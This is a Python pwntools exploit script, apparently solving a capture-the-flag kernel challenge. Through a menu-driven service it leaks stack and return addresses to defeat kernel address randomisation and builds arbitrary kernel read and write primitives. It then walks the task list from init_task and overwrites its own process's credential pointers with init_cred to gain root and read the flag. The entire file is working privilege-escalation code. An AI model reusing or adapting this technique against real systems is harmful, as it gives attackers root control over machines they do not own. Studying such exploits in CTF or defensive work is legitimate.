#!/usr/bin/env python2
from pwn import *
# context.log_level = "debug"

# START CONSTANTS
# PLUG CONSTANTS HERE
INIT_TASK=0xffffffff81a214c0
READ_OFFSET_SAVED_RBP=0x0000000000000020
OFFSET_SAVED_RBP_TO_BASE=0x0000000000000040
READ_OFFSET_RET_ADDR=0x0000000000000048
OFFSET_RET_ADDR=0x00000000000e1157
STRUCT_OFFSET_COMM=0x00000000000004d4
STRUCT_OFFSET_TASKS=0x00000000000004a0
STRUCT_OFFSET_CREDS_1=0x0000000000000040
STRUCT_OFFSET_CREDS_2=0x0000000000000160
PROCESS_NAME='client_kernel_kid'
STACK_OFFSET_READ_TO_WRITE=0x0000000000000000
first_kernel_qw=0xe800a03f51258d48
# END CONSTANTS

DEFAULT_KERNEL_BASE = 0xffffffff81000000

r = None
base_address = None

def menu(num):
    r.sendlineafter(". Bye!\r\r\n> ", "{:d}".format(num))

def prompt():
    r.recvuntil("\n> ")

def read_offset(offset):
    menu(1)
    prompt()
    r.sendline("{:d}".format(offset))
    r.recvuntil(": ")
    answ = r.recvline().rstrip()[:16]
    res = int(answ, 16)
    return res

def write_offset(offset, value):
    menu(2)
    prompt()
    r.sendline("{:d}".format(offset))
    prompt()
    r.sendline("{:d}".format(value))

def make_off(addr, base_address):
    off = addr - base_address
    if off < 0:
        off += 2**64
    return off

def arb_read(addr):
    global base_address
    val = read_offset(make_off(addr, base_address))
    print("arb read: 0x{:016x} = 0x{:016x}".format(addr, val))
    return val

def arb_write(addr, value):
    global base_address
    global STACK_OFFSET_READ_TO_WRITE
    print("arb write: *0x{:016x} = 0x{:016x} [OFFSET: {}]".format(addr, value, STACK_OFFSET_READ_TO_WRITE))
    return write_offset(make_off(addr, base_address) - STACK_OFFSET_READ_TO_WRITE, value)
    
def find_base_address():
    saved_rbp = read_offset(READ_OFFSET_SAVED_RBP)
    stack_base = saved_rbp - OFFSET_SAVED_RBP_TO_BASE
    ret_addr = read_offset(READ_OFFSET_RET_ADDR)
    kernel_slide = ret_addr - OFFSET_RET_ADDR - DEFAULT_KERNEL_BASE

    return stack_base, kernel_slide

def find_task_base(task_base, task_name, tasks_member_offset, comm_member_offset):
    for _ in range(64):
        comm = p64(arb_read(task_base + comm_member_offset))
        if "\0" in comm:
            comm = comm[:comm.index("\0")]
        
        print("Task @0x{:016x}: '{}'".format(task_base, comm))
        if task_name.startswith(comm):
            print("Found!")
            return task_base
        else:
            # +8 -> tasks.previous, +0 -> tasks.next
            task_base = arb_read(task_base + tasks_member_offset + 8) - tasks_member_offset

    return None

def main(HOST, PORT):
    global r
    global INIT_TASK
    global base_address
    try:
        r = remote(HOST, PORT)

        base_address, kernel_slide = find_base_address()
        assert(base_address is not None and kernel_slide is not None)

        print("Got base address: 0x{:016x}, kernel_slide: 0x{:016x}".format(base_address, kernel_slide))

        INIT_TASK += kernel_slide

        print("Checking arbitrary read...")
        assert(arb_read(DEFAULT_KERNEL_BASE + kernel_slide) == first_kernel_qw)
        print("...done")

        print("Retrieving current task...")
        task_base = find_task_base(INIT_TASK, PROCESS_NAME, STRUCT_OFFSET_TASKS, STRUCT_OFFSET_COMM)
        init_cred = arb_read(INIT_TASK + STRUCT_OFFSET_CREDS_1)
        print("Got current_task: 0x{:016x}. init_creds at: 0x{:016x}".format(task_base, init_cred))
        arb_write(task_base + STRUCT_OFFSET_CREDS_1, init_cred)
        arb_write(task_base + STRUCT_OFFSET_CREDS_2, init_cred)

        r.sendline("4")
        r.recvuntil("flag{")
        flag = "flag{" + r.recvuntil("}")
        r.close()
        
        print("Success!")
        exit(0)
    except EOFError:
        print("EOFError...")
        r.close()

if __name__ == "__main__":
    HOST = "localhost"
    PORT = 4444
    main(HOST, PORT)